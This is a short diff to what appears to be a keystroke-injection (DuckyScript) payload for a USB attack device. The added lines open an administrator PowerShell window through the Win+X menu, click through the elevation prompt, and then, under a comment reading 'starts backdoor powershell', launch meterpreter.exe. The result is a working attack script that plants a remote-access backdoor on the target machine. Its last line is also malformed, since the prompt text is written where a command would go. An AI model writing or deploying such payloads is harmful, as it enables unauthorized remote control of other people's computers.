@@ -18,3 +18,11 @@ DELAY 300
 ENTER
 DELAY 2000
 ALT F4
+REM opens admin powershell window
+DELAY 1000
+GUI x
+DOWNARROW REPEAT 11
+ENTER
+ALT y
+REM starts backdoor powershell 
+C:\> Start-Process meterpreter.exe
